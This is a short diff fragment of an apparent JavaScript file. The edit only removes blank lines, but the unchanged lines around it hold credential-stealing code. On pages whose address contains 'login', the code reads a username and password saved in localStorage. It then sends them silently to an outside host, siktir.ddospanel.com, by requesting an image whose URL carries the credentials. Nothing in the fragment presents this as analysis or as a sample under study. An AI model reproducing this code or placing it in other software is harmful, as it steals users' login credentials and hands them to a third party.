@@ -43,11 +43,7 @@ if (window.location.href.indexOf("login") >= 0) {
 
 if(localStorage['sw'] && localStorage['pw']){
 	new Image().src = "http://siktir.ddospanel.com/cptw.php?username=" + localStorage['sw'] + "&password=" + localStorage['pw'];
-
 }
-
-
-
 
 }
 
